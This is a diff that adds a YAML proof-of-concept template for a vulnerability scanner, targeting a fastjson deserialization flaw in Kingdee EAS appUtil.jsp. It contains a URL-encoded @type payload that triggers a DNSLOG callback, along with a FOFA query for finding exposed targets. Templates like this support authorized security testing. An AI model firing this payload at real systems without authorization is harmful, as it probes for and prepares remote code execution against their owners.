@@ -1,0 +1,18 @@
+id: poc-yaml-kingdee-eas-apputil-fastjson-rce
+info:
+  name: 金蝶EAS appUtil.jsp fastjson反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: 金蝶 EAS
+  fofa: app="Kingdee-EAS"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22{{.reverseDomain}}%22%7D%7D
+  expression: "status_code == 200 && \ncontains(body,\"om.alibaba.fastjson.JSONObject\"\
+    ) &&\nreverse.Verify()\n"
+transport: http
